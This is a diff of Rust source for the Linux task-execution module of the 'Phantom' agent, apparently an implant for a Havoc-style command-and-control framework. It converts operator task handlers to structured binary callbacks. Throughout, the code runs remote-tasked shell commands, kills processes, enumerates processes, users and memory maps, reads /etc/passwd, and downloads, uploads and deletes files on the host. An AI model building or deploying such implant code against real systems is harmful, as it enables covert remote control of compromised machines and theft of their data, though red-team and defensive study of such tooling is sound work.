@@ -1,17 +1,20 @@
 //! Linux task execution for the Phantom agent.
 
-use std::collections::HashMap;
+use std::collections::{BTreeMap, HashMap};
 use std::ffi::OsString;
 use std::fs;
 use std::io::{ErrorKind, Read, Write};
 use std::net::{Ipv4Addr, SocketAddrV4, TcpListener, TcpStream};
+use std::os::unix::fs::MetadataExt;
 use std::path::{Path, PathBuf};
 use std::process::Stdio;
+use std::time::{SystemTime, UNIX_EPOCH};
 
 use red_cell_common::demon::{
     DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
     DemonSocketCommand, DemonSocketType,
 };
+use time::OffsetDateTime;
 use tokio::net::TcpStream as TokioTcpStream;
 use tokio::process::Command;
 
@@ -24,6 +27,7 @@ pub(crate) enum PendingCallback {
     Output { request_id: u32, text: String },
     Error { request_id: u32, text: String },
     Exit { request_id: u32, exit_method: u32 },
+    Structured { command_id: u32, request_id: u32, payload: Vec<u8> },
     MemFileAck { request_id: u32, mem_file_id: u32, success: bool },
     FsUpload { request_id: u32, file_size: u32, path: String },
     Socket { request_id: u32, payload: Vec<u8> },
@@ -60,6 +64,40 @@ struct ManagedSocket {
     bind_port: u32,
     forward_addr: u32,
     forward_port: u32,
+}
+
+#[derive(Debug)]
+struct FilesystemEntry {
+    name: String,
+    is_dir: bool,
+    size: u64,
+    modified: ModifiedTime,
+}
+
+#[derive(Debug)]
+struct FilesystemListing {
+    root_path: String,
+    entries: Vec<FilesystemEntry>,
+}
+
+#[derive(Debug)]
+struct ModifiedTime {
+    day: u32,
+    month: u32,
+    year: u32,
+    minute: u32,
+    hour: u32,
+}
+
+#[derive(Debug)]
+struct ProcessEntry {
+    name: String,
+    pid: u32,
+    parent_pid: u32,
+    session: u32,
+    threads: u32,
+    user: String,
+    is_wow64: bool,
 }
 
 impl PhantomState {
@@ -269,8 +307,12 @@ pub(crate) async fn execute(
             execute_filesystem(package.request_id, &package.payload, state).await?;
         }
         DemonCommand::CommandProcList => {
-            let text = execute_process_list(&package.payload)?;
-            state.queue_callback(PendingCallback::Output { request_id: package.request_id, text });
+            let payload = execute_process_list(&package.payload)?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandProcList),
+                request_id: package.request_id,
+                payload,
+            });
         }
         DemonCommand::CommandProc => {
             execute_process(package.request_id, &package.payload, state).await?;
@@ -318,36 +360,28 @@ async fn execute_filesystem(
         DemonFilesystemCommand::Dir => {
             let _file_explorer = parser.bool32()?;
             let target = normalize_path(&parser.wstring()?);
-            let _subdirs = parser.bool32()?;
+            let subdirs = parser.bool32()?;
             let files_only = parser.bool32()?;
             let dirs_only = parser.bool32()?;
-            let _list_only = parser.bool32()?;
+            let list_only = parser.bool32()?;
             let _starts = parser.wstring()?;
             let _contains = parser.wstring()?;
             let _ends = parser.wstring()?;
-
-            let entries = fs::read_dir(&target).map_err(|error| io_error(&target, error))?;
-            let mut output = Vec::new();
-            for entry in entries {
-                let entry = entry.map_err(|error| io_error(&target, error))?;
-                let metadata = entry.metadata().map_err(|error| io_error(entry.path(), error))?;
-                if files_only && metadata.is_dir() {
-                    continue;
-                }
-                if dirs_only && metadata.is_file() {
-                    continue;
-                }
-                let kind = if metadata.is_dir() { "dir" } else { "file" };
-                output.push(format!("{kind}\t{}", entry.path().display()));
-            }
-            state.queue_callback(PendingCallback::Output { request_id, text: output.join("\n") });
+            let payload =
+                encode_fs_dir_listing(&target, subdirs, files_only, dirs_only, list_only)?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
+                request_id,
+                payload,
+            });
         }
         DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
             let path = normalize_path(&parser.wstring()?);
             let contents = fs::read(&path).map_err(|error| io_error(&path, error))?;
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: String::from_utf8_lossy(&contents).into_owned(),
+                payload: encode_fs_cat(&path, &contents)?,
             });
         }
         DemonFilesystemCommand::Upload => {
@@ -382,55 +416,62 @@ async fn execute_filesystem(
         DemonFilesystemCommand::Cd => {
             let path = normalize_path(&parser.wstring()?);
             std::env::set_current_dir(&path).map_err(|error| io_error(&path, error))?;
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: path.display().to_string(),
+                payload: encode_fs_path_only(DemonFilesystemCommand::Cd, &path)?,
             });
         }
         DemonFilesystemCommand::Remove => {
             let path = normalize_path(&parser.wstring()?);
+            let is_dir = path.is_dir();
             if path.is_dir() {
                 fs::remove_dir(&path).map_err(|error| io_error(&path, error))?;
             } else {
                 fs::remove_file(&path).map_err(|error| io_error(&path, error))?;
             }
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: path.display().to_string(),
+                payload: encode_fs_remove(&path, is_dir)?,
             });
         }
         DemonFilesystemCommand::Mkdir => {
             let path = normalize_path(&parser.wstring()?);
             fs::create_dir_all(&path).map_err(|error| io_error(&path, error))?;
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: path.display().to_string(),
+                payload: encode_fs_path_only(DemonFilesystemCommand::Mkdir, &path)?,
             });
         }
         DemonFilesystemCommand::Copy => {
             let from = normalize_path(&parser.wstring()?);
             let to = normalize_path(&parser.wstring()?);
             fs::copy(&from, &to).map_err(|error| io_error(&from, error))?;
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: format!("{} -> {}", from.display(), to.display()),
+                payload: encode_fs_copy_move(DemonFilesystemCommand::Copy, true, &from, &to)?,
             });
         }
         DemonFilesystemCommand::Move => {
             let from = normalize_path(&parser.wstring()?);
             let to = normalize_path(&parser.wstring()?);
             fs::rename(&from, &to).map_err(|error| io_error(&from, error))?;
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: format!("{} -> {}", from.display(), to.display()),
+                payload: encode_fs_copy_move(DemonFilesystemCommand::Move, true, &from, &to)?,
             });
         }
         DemonFilesystemCommand::GetPwd => {
             let path = std::env::current_dir()
                 .map_err(|error| PhantomError::Process(error.to_string()))?;
-            state.queue_callback(PendingCallback::Output {
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandFs),
                 request_id,
-                text: path.display().to_string(),
+                payload: encode_fs_path_only(DemonFilesystemCommand::GetPwd, &path)?,
             });
         }
     }
@@ -438,23 +479,12 @@ async fn execute_filesystem(
     Ok(())
 }
 
-fn execute_process_list(payload: &[u8]) -> Result<String, PhantomError> {
+fn execute_process_list(payload: &[u8]) -> Result<Vec<u8>, PhantomError> {
     let mut parser = TaskParser::new(payload);
-    let _process_ui = parser.int32()?;
-
-    let mut lines = Vec::new();
-    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
-        let entry = entry.map_err(|error| io_error("/proc", error))?;
-        let file_name = entry.file_name();
-        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
-            continue;
-        };
-        let exe = fs::read_link(entry.path().join("exe")).unwrap_or_else(|_| PathBuf::from("?"));
-        lines.push(format!("{pid}\t{}", executable_name(&exe)));
-    }
-
-    lines.sort();
-    Ok(lines.join("\n"))
+    let process_ui = u32::try_from(parser.int32()?)
+        .map_err(|_| PhantomError::TaskParse("negative process ui flag"))?;
+    let processes = enumerate_processes()?;
+    encode_process_list(process_ui, &processes)
 }
 
 async fn execute_process(
@@ -473,7 +503,7 @@ async fn execute_process(
             let process = parser.wstring()?;
             let process_args = parser.wstring()?;
             let piped = parser.bool32()?;
-            let _verbose = parser.bool32()?;
+            let verbose = parser.bool32()?;
 
             let binary = if process.is_empty() { String::from("/bin/sh") } else { process };
 
@@ -489,10 +519,18 @@ async fn execute_process(
             }
             if piped {
                 command.stdout(Stdio::piped()).stderr(Stdio::piped());
-                let output = command
-                    .output()
+                let child =
+                    command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
+                let pid = child.id().unwrap_or_default();
+                let output = child
+                    .wait_with_output()
                     .await
                     .map_err(|error| PhantomError::Process(error.to_string()))?;
+                state.queue_callback(PendingCallback::Structured {
+                    command_id: u32::from(DemonCommand::CommandProc),
+                    request_id,
+                    payload: encode_proc_create(&binary, pid, true, true, verbose)?,
+                });
                 let mut merged = String::from_utf8_lossy(&output.stdout).into_owned();
                 if !output.stderr.is_empty() {
                     if !merged.is_empty() {
@@ -504,41 +542,56 @@ async fn execute_process(
             } else {
                 let child =
                     command.spawn().map_err(|error| PhantomError::Process(error.to_string()))?;
-                state.queue_callback(PendingCallback::Output {
+                state.queue_callback(PendingCallback::Structured {
+                    command_id: u32::from(DemonCommand::CommandProc),
                     request_id,
-                    text: format!("spawned {} with pid {}", binary, child.id().unwrap_or_default()),
+                    payload: encode_proc_create(
+                        &binary,
+                        child.id().unwrap_or_default(),
+                        true,
+                        false,
+                        verbose,
+                    )?,
                 });
             }
         }
         DemonProcessCommand::Kill => {
             let pid = u32::try_from(parser.int32()?)
                 .map_err(|_| PhantomError::TaskParse("negative pid"))?;
-            Command::new("kill")
+            let success = Command::new("kill")
                 .arg("-9")
                 .arg(pid.to_string())
                 .status()
                 .await
-                .map_err(|error| PhantomError::Process(error.to_string()))?;
-            state.queue_callback(PendingCallback::Output {
+                .map_err(|error| PhantomError::Process(error.to_string()))?
+                .success();
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandProc),
                 request_id,
-                text: format!("terminated pid {pid}"),
+                payload: encode_proc_kill(success, pid),
             });
         }
         DemonProcessCommand::Grep => {
             let needle = parser.wstring()?.to_lowercase();
-            let filtered = execute_process_list(&0_i32.to_le_bytes())?
-                .lines()
-                .filter(|line| line.to_lowercase().contains(&needle))
-                .collect::<Vec<_>>()
-                .join("\n");
-            state.queue_callback(PendingCallback::Output { request_id, text: filtered });
+            let filtered = enumerate_processes()?
+                .into_iter()
+                .filter(|process| process.name.to_lowercase().contains(&needle))
+                .collect::<Vec<_>>();
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandProc),
+                request_id,
+                payload: encode_proc_grep(&filtered)?,
+            });
         }
         DemonProcessCommand::Modules => {
-            let pid = u32::try_from(parser.int32().unwrap_or_default()).unwrap_or_default();
-            let maps =
-                if pid == 0 { "/proc/self/maps".to_string() } else { format!("/proc/{pid}/maps") };
-            let contents = fs::read_to_string(&maps).map_err(|error| io_error(&maps, error))?;
-            state.queue_callback(PendingCallback::Output { request_id, text: contents });
+            let pid = u32::try_from(parser.int32()?)
+                .map_err(|_| PhantomError::TaskParse("negative pid"))?;
+            let modules = enumerate_modules(pid)?;
+            state.queue_callback(PendingCallback::Structured {
+                command_id: u32::from(DemonCommand::CommandProc),
+                request_id,
+                payload: encode_proc_modules(pid, &modules)?,
+            });
         }
         DemonProcessCommand::Memory => {
             let pid = parser.int32()?;
@@ -566,27 +619,15 @@ fn execute_network(
     let subcommand = DemonNetCommand::try_from(subcommand)?;
 
     match subcommand {
-        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Output {
+        DemonNetCommand::Domain => state.queue_callback(PendingCallback::Structured {
+            command_id: u32::from(DemonCommand::CommandNet),
             request_id,
-            text: fs::read_to_string("/etc/resolv.conf")
-                .ok()
-                .and_then(|contents| {
-                    contents.lines().find_map(|line| {
-                        let trimmed = line.trim();
-                        trimmed
-                            .strip_prefix("search ")
-                            .or_else(|| trimmed.strip_prefix("domain "))
-                            .map(|value| value.trim().to_string())
-                    })
-                })
-                .unwrap_or_else(|| String::from("WORKGROUP")),
+            payload: encode_net_domain(&linux_domain_name())?,
         }),
-        DemonNetCommand::Computer => state.queue_callback(PendingCallback::Output {
+        DemonNetCommand::Computer => state.queue_callback(PendingCallback::Structured {
+            command_id: u32::from(DemonCommand::CommandNet),
             request_id,
-            text: fs::read_to_string("/etc/hostname")
-                .unwrap_or_else(|_| String::from("unknown"))
-                .trim()
-                .to_string(),
+            payload: encode_u32(u32::from(DemonNetCommand::Computer)),
         }),
         DemonNetCommand::Logons
         | DemonNetCommand::Sessions
@@ -962,6 +1003,137 @@ fn raw_socket_error(error: &std::io::Error) -> u32 {
     error.raw_os_error().and_then(|code| u32::try_from(code).ok()).unwrap_or(1)
 }
 
+fn enumerate_processes() -> Result<Vec<ProcessEntry>, PhantomError> {
+    let mut processes = Vec::new();
+    for entry in fs::read_dir("/proc").map_err(|error| io_error("/proc", error))? {
+        let entry = entry.map_err(|error| io_error("/proc", error))?;
+        let file_name = entry.file_name();
+        let Some(pid) = file_name.to_str().and_then(|value| value.parse::<u32>().ok()) else {
+            continue;
+        };
+        match read_process_entry(pid) {
+            Ok(process) => processes.push(process),
+            Err(PhantomError::Io { message, .. })
+                if message.contains("No such file or directory") =>
+            {
+                continue;
+            }
+            Err(error) => return Err(error),
+        }
+    }
+    processes.sort_by(|left, right| left.pid.cmp(&right.pid));
+    Ok(processes)
+}
+
+fn read_process_entry(pid: u32) -> Result<ProcessEntry, PhantomError> {
+    let proc_path = PathBuf::from(format!("/proc/{pid}"));
+    let status = fs::read_to_string(proc_path.join("status"))
+        .map_err(|error| io_error(proc_path.join("status"), error))?;
+    let metadata = fs::metadata(&proc_path).map_err(|error| io_error(&proc_path, error))?;
+    let name = status_field(&status, "Name").map(str::to_owned).unwrap_or_else(|| pid.to_string());
+    let parent_pid = status_field(&status, "PPid")
+        .and_then(|value| value.parse::<u32>().ok())
+        .unwrap_or_default();
+    let threads =
+        status_field(&status, "Threads").and_then(|value| value.parse::<u32>().ok()).unwrap_or(1);
+    let session = read_process_session(pid).unwrap_or_default();
+    let exe = fs::read_link(proc_path.join("exe")).unwrap_or_else(|_| PathBuf::from(&name));
+    let is_wow64 = process_arch_bits(&exe).unwrap_or(64) == 32;
+
+    Ok(ProcessEntry {
+        name: executable_name(&exe),
+        pid,
+        parent_pid,
+        session,
+        threads,
+        user: username_for_uid(metadata.uid()),
+        is_wow64,
+    })
+}
+
+fn status_field<'a>(status: &'a str, field: &str) -> Option<&'a str> {
+    status.lines().find_map(|line| {
+        line.strip_prefix(field).and_then(|value| value.strip_prefix(':')).map(str::trim)
+    })
+}
+
+fn read_process_session(pid: u32) -> Option<u32> {
+    let stat = fs::read_to_string(format!("/proc/{pid}/stat")).ok()?;
+    let suffix = stat.split_once(") ")?.1;
+    let fields = suffix.split_whitespace().collect::<Vec<_>>();
+    fields.get(3)?.parse::<u32>().ok()
+}
+
+fn process_arch_bits(exe: &Path) -> Option<u32> {
+    let header = fs::read(exe).ok()?;
+    if header.len() < 5 || &header[..4] != b"\x7FELF" {
+        return None;
+    }
+    match header[4] {
+        1 => Some(32),
+        2 => Some(64),
+        _ => None,
+    }
+}
+
+fn username_for_uid(uid: u32) -> String {
+    fs::read_to_string("/etc/passwd")
+        .ok()
+        .and_then(|passwd| {
+            passwd.lines().find_map(|line| {
+                let mut fields = line.split(':');
+                let username = fields.next()?;
+                let _password = fields.next()?;
+                let entry_uid = fields.next()?.parse::<u32>().ok()?;
+                (entry_uid == uid).then(|| username.to_string())
+            })
+        })
+        .unwrap_or_else(|| uid.to_string())
+}
+
+fn enumerate_modules(pid: u32) -> Result<Vec<(String, u64)>, PhantomError> {
+    let maps_path = if pid == 0 {
+        PathBuf::from("/proc/self/maps")
+    } else {
+        PathBuf::from(format!("/proc/{pid}/maps"))
+    };
+    let contents = fs::read_to_string(&maps_path).map_err(|error| io_error(&maps_path, error))?;
+    let mut modules = BTreeMap::new();
+    for line in contents.lines() {
+        let mut parts = line.split_whitespace();
+        let Some(range) = parts.next() else {
+            continue;
+        };
+        let path = parts.nth(4).unwrap_or_default();
+        if path.is_empty() || !path.starts_with('/') {
+            continue;
+        }
+        let Some((base, _)) = range.split_once('-') else {
+            continue;
+        };
+        let Ok(base_addr) = u64::from_str_radix(base, 16) else {
+            continue;
+        };
+        modules.entry(path.to_string()).or_insert(base_addr);
+    }
+    Ok(modules.into_iter().collect())
+}
+
+fn linux_domain_name() -> String {
+    fs::read_to_string("/etc/resolv.conf")
+        .ok()
+        .and_then(|contents| {
+            contents.lines().find_map(|line| {
+                let trimmed = line.trim();
+                trimmed
+                    .strip_prefix("search ")
+                    .or_else(|| trimmed.strip_prefix("domain "))
+                    .map(|value| value.trim().to_string())
+            })
+        })
+        .unwrap_or_default()
+}
+
 fn normalize_path(value: &str) -> PathBuf {
     if value.is_empty() || value == "." {
         std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."))
@@ -978,7 +1150,224 @@ fn split_args(arguments: &str) -> Vec<OsString> {
     arguments.split_whitespace().filter(|value| !value.is_empty()).map(OsString::from).collect()
 }
 
+fn encode_process_list(
+    process_ui: u32,
+    processes: &[ProcessEntry],
+) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(process_ui);
+    for process in processes {
+        payload.extend_from_slice(&encode_utf16(&process.name)?);
+        payload.extend_from_slice(&encode_u32(process.pid));
+        payload.extend_from_slice(&encode_bool(process.is_wow64));
+        payload.extend_from_slice(&encode_u32(process.parent_pid));
+        payload.extend_from_slice(&encode_u32(process.session));
+        payload.extend_from_slice(&encode_u32(process.threads));
+        payload.extend_from_slice(&encode_utf16(&process.user)?);
+    }
+    Ok(payload)
+}
+
+fn encode_proc_create(
+    path: &str,
+    pid: u32,
+    success: bool,
+    piped: bool,
+    verbose: bool,
+) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonProcessCommand::Create));
+    payload.extend_from_slice(&encode_utf16(path)?);
+    payload.extend_from_slice(&encode_u32(pid));
+    payload.extend_from_slice(&encode_bool(success));
+    payload.extend_from_slice(&encode_bool(piped));
+    payload.extend_from_slice(&encode_bool(verbose));
+    Ok(payload)
+}
+
+fn encode_proc_kill(success: bool, pid: u32) -> Vec<u8> {
+    let mut payload = encode_u32(u32::from(DemonProcessCommand::Kill));
+    payload.extend_from_slice(&encode_bool(success));
+    payload.extend_from_slice(&encode_u32(pid));
+    payload
+}
+
+fn encode_proc_grep(processes: &[ProcessEntry]) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonProcessCommand::Grep));
+    for process in processes {
+        payload.extend_from_slice(&encode_utf16(&process.name)?);
+        payload.extend_from_slice(&encode_u32(process.pid));
+        payload.extend_from_slice(&encode_u32(process.parent_pid));
+        payload.extend_from_slice(&encode_utf16(&process.user)?);
+        payload.extend_from_slice(&encode_u32(if process.is_wow64 { 86 } else { 64 }));
+    }
+    Ok(payload)
+}
+
+fn encode_proc_modules(pid: u32, modules: &[(String, u64)]) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonProcessCommand::Modules));
+    payload.extend_from_slice(&encode_u32(pid));
+    for (name, base) in modules {
+        payload.extend_from_slice(&encode_bytes(name.as_bytes())?);
+        payload.extend_from_slice(&encode_u64(*base));
+    }
+    Ok(payload)
+}
+
+fn encode_net_domain(domain: &str) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonNetCommand::Domain));
+    payload.extend_from_slice(&encode_bytes(domain.as_bytes())?);
+    Ok(payload)
+}
+
+fn encode_fs_dir_listing(
+    target: &Path,
+    subdirs: bool,
+    files_only: bool,
+    dirs_only: bool,
+    list_only: bool,
+) -> Result<Vec<u8>, PhantomError> {
+    let start_path = directory_root_path(target);
+    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Dir));
+    payload.extend_from_slice(&encode_bool(false));
+    payload.extend_from_slice(&encode_bool(list_only));
+    payload.extend_from_slice(&encode_utf16(&start_path)?);
+
+    let listings = collect_directory_listings(target, subdirs, files_only, dirs_only)?;
+    payload.extend_from_slice(&encode_bool(true));
+    for listing in listings {
+        let files = listing.entries.iter().filter(|entry| !entry.is_dir).count() as u32;
+        let dirs = listing.entries.iter().filter(|entry| entry.is_dir).count() as u32;
+        let total_size = listing
+            .entries
+            .iter()
+            .filter(|entry| !entry.is_dir)
+            .map(|entry| entry.size)
+            .sum::<u64>();
+
+        payload.extend_from_slice(&encode_utf16(&listing.root_path)?);
+        payload.extend_from_slice(&encode_u32(files));
+        payload.extend_from_slice(&encode_u32(dirs));
+        if !list_only {
+            payload.extend_from_slice(&encode_u64(total_size));
+        }
+
+        for entry in listing.entries {
+            payload.extend_from_slice(&encode_utf16(&entry.name)?);
+            if !list_only {
+                payload.extend_from_slice(&encode_bool(entry.is_dir));
+                payload.extend_from_slice(&encode_u64(entry.size));
+                payload.extend_from_slice(&encode_u32(entry.modified.day));
+                payload.extend_from_slice(&encode_u32(entry.modified.month));
+                payload.extend_from_slice(&encode_u32(entry.modified.year));
+                payload.extend_from_slice(&encode_u32(entry.modified.minute));
+                payload.extend_from_slice(&encode_u32(entry.modified.hour));
+            }
+        }
+    }
+
+    Ok(payload)
+}
+
+fn collect_directory_listings(
+    target: &Path,
+    subdirs: bool,
+    files_only: bool,
+    dirs_only: bool,
+) -> Result<Vec<FilesystemListing>, PhantomError> {
+    let mut listings = Vec::new();
+    let mut pending = vec![target.to_path_buf()];
+    while let Some(root) = pending.pop() {
+        let mut entries = Vec::new();
+        let read_dir = fs::read_dir(&root).map_err(|error| io_error(&root, error))?;
+        for entry in read_dir {
+            let entry = entry.map_err(|error| io_error(&root, error))?;
+            let path = entry.path();
+            let metadata = entry.metadata().map_err(|error| io_error(&path, error))?;
+            if metadata.is_dir() && subdirs {
+                pending.push(path.clone());
+            }
+            if files_only && metadata.is_dir() {
+                continue;
+            }
+            if dirs_only && metadata.is_file() {
+                continue;
+            }
+            entries.push(FilesystemEntry {
+                name: entry.file_name().to_string_lossy().into_owned(),
+                is_dir: metadata.is_dir(),
+                size: metadata.len(),
+                modified: modified_time(metadata.modified().ok()),
+            });
+        }
+        entries.sort_by(|left, right| left.name.cmp(&right.name));
+        listings.push(FilesystemListing { root_path: directory_root_path(&root), entries });
+    }
+    listings.sort_by(|left, right| left.root_path.cmp(&right.root_path));
+    Ok(listings)
+}
+
+fn modified_time(timestamp: Option<SystemTime>) -> ModifiedTime {
+    let unix_timestamp = timestamp
+        .and_then(|time| time.duration_since(UNIX_EPOCH).ok())
+        .map(|duration| duration.as_secs() as i64)
+        .unwrap_or_default();
+    let datetime =
+        OffsetDateTime::from_unix_timestamp(unix_timestamp).unwrap_or(OffsetDateTime::UNIX_EPOCH);
+    ModifiedTime {
+        day: datetime.day().into(),
+        month: u8::from(datetime.month()).into(),
+        year: u32::try_from(datetime.year()).unwrap_or_default(),
+        minute: datetime.minute().into(),
+        hour: datetime.hour().into(),
+    }
+}
+
+fn directory_root_path(path: &Path) -> String {
+    let display = path.display().to_string();
+    if display.ends_with('/') { display } else { format!("{display}/") }
+}
+
+fn encode_fs_cat(path: &Path, contents: &[u8]) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Cat));
+    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
+    payload.extend_from_slice(&encode_bool(true));
+    payload.extend_from_slice(&encode_bytes(contents)?);
+    Ok(payload)
+}
+
+fn encode_fs_path_only(
+    subcommand: DemonFilesystemCommand,
+    path: &Path,
+) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(subcommand));
+    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
+    Ok(payload)
+}
+
+fn encode_fs_remove(path: &Path, is_dir: bool) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(DemonFilesystemCommand::Remove));
+    payload.extend_from_slice(&encode_bool(is_dir));
+    payload.extend_from_slice(&encode_utf16(&path.display().to_string())?);
+    Ok(payload)
+}
+
+fn encode_fs_copy_move(
+    subcommand: DemonFilesystemCommand,
+    success: bool,
+    from: &Path,
+    to: &Path,
+) -> Result<Vec<u8>, PhantomError> {
+    let mut payload = encode_u32(u32::from(subcommand));
+    payload.extend_from_slice(&encode_bool(success));
+    payload.extend_from_slice(&encode_utf16(&from.display().to_string())?);
+    payload.extend_from_slice(&encode_utf16(&to.display().to_string())?);
+    Ok(payload)
+}
+
 fn encode_u32(value: u32) -> Vec<u8> {
+    value.to_be_bytes().to_vec()
+}
+
+fn encode_u64(value: u64) -> Vec<u8> {
     value.to_be_bytes().to_vec()
 }
 
@@ -1118,6 +1507,7 @@ impl PendingCallback {
             Self::Output { .. } => u32::from(DemonCommand::CommandOutput),
             Self::Error { .. } => u32::from(DemonCommand::CommandError),
             Self::Exit { .. } => u32::from(DemonCommand::CommandExit),
+            Self::Structured { command_id, .. } => *command_id,
             Self::MemFileAck { .. } => u32::from(DemonCommand::CommandMemFile),
             Self::FsUpload { .. } => u32::from(DemonCommand::CommandFs),
             Self::Socket { .. } => u32::from(DemonCommand::CommandSocket),
@@ -1129,6 +1519,7 @@ impl PendingCallback {
             Self::Output { request_id, .. }
             | Self::Error { request_id, .. }
             | Self::Exit { request_id, .. }
+            | Self::Structured { request_id, .. }
             | Self::MemFileAck { request_id, .. }
             | Self::FsUpload { request_id, .. }
             | Self::Socket { request_id, .. } => *request_id,
@@ -1145,6 +1536,7 @@ impl PendingCallback {
                 Ok(payload)
             }
             Self::Exit { exit_method, .. } => Ok(encode_u32(*exit_method)),
+            Self::Structured { payload, .. } => Ok(payload.clone()),
             Self::MemFileAck { mem_file_id, success, .. } => {
                 let mut payload = Vec::new();
                 payload.extend_from_slice(&encode_u32(*mem_file_id));
@@ -1167,7 +1559,8 @@ mod tests {
     use std::net::Ipv4Addr;
 
     use red_cell_common::demon::{
-        DemonCommand, DemonFilesystemCommand, DemonPackage, DemonProcessCommand, DemonSocketCommand,
+        DemonCommand, DemonFilesystemCommand, DemonNetCommand, DemonPackage, DemonProcessCommand,
+        DemonSocketCommand,
     };
 
     use super::{PendingCallback, PhantomState, execute};
@@ -1180,6 +1573,30 @@ mod tests {
         payload
     }
 
+    fn read_u32(payload: &[u8], offset: &mut usize) -> u32 {
+        let end = *offset + 4;
+        let value = u32::from_be_bytes(payload[*offset..end].try_into().expect("u32"));
+        *offset = end;
+        value
+    }
+
+    fn read_bytes<'a>(payload: &'a [u8], offset: &mut usize) -> &'a [u8] {
+        let len = read_u32(payload, offset) as usize;
+        let end = *offset + len;
+        let bytes = &payload[*offset..end];
+        *offset = end;
+        bytes
+    }
+
+    fn read_utf16(payload: &[u8], offset: &mut usize) -> String {
+        let bytes = read_bytes(payload, offset);
+        let utf16 = bytes
+            .chunks_exact(2)
+            .map(|chunk| u16::from_le_bytes([chunk[0], chunk[1]]))
+            .collect::<Vec<_>>();
+        String::from_utf16(&utf16).expect("utf16")
+    }
+
     #[tokio::test]
     async fn command_no_job_returns_no_callbacks() {
         let package = DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
@@ -1189,7 +1606,7 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn get_pwd_queues_output_callback() {
+    async fn get_pwd_queues_structured_fs_callback() {
         let mut payload = Vec::new();
         payload.extend_from_slice(&(DemonFilesystemCommand::GetPwd as i32).to_le_bytes());
         let package = DemonPackage::new(DemonCommand::CommandFs, 1, payload);
@@ -1197,14 +1614,23 @@ mod tests {
 
         execute(&package, &mut state).await.expect("execute");
 
-        assert!(matches!(
-            state.drain_callbacks().as_slice(),
-            [PendingCallback::Output { request_id: 1, .. }]
-        ));
+        let callbacks = state.drain_callbacks();
+        let [PendingCallback::Structured { command_id, request_id, payload }] =
+            callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandFs));
+        assert_eq!(*request_id, 1);
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonFilesystemCommand::GetPwd));
+        let path = read_utf16(payload, &mut offset);
+        assert!(!path.is_empty());
     }
 
     #[tokio::test]
-    async fn proc_create_with_pipe_returns_command_output() {
+    async fn proc_create_with_pipe_returns_structured_and_output_callbacks() {
         let mut payload = Vec::new();
         payload.extend_from_slice(&(DemonProcessCommand::Create as i32).to_le_bytes());
         payload.extend_from_slice(&0_i32.to_le_bytes());
@@ -1217,10 +1643,73 @@ mod tests {
 
         execute(&package, &mut state).await.expect("execute");
 
-        assert!(matches!(
-            state.drain_callbacks().as_slice(),
-            [PendingCallback::Output { request_id: 2, text }] if text == "phantom-test"
-        ));
+        let callbacks = state.drain_callbacks();
+        let [
+            PendingCallback::Structured { command_id, request_id, payload },
+            PendingCallback::Output { request_id: output_request_id, text },
+        ] = callbacks.as_slice()
+        else {
+            panic!("unexpected callbacks: {callbacks:?}");
+        };
+        assert_eq!(*command_id, u32::from(DemonCommand::CommandProc));
+        assert_eq!(*request_id, 2);
+        assert_eq!(*output_request_id, 2);
+        assert_eq!(text, "phantom-test");
+
+        let mut offset = 0;
+        assert_eq!(read_u32(payload, &mut offset), u32::from(DemonProcessCommand::Create));
+        assert_eq!(read_utf16(payload, &mut offset), "/bin/sh");
+        assert!(read_u32(payload, &mut offset) > 0);
+        assert_eq!(read_u32(payload, &mut offset), 1);
+        assert_eq!(read_u32(payload, &mut offset), 1);
+        assert_eq!(read_u32(payload, &mut offset), 0);
+    }
+
+    #[tokio::test]
+    async fn proc_list_returns_structured_process_payload() {
+        let package =
+            DemonPackage::new(DemonCommand::CommandProcList, 7, 0_i32.to_le_bytes().to_vec());
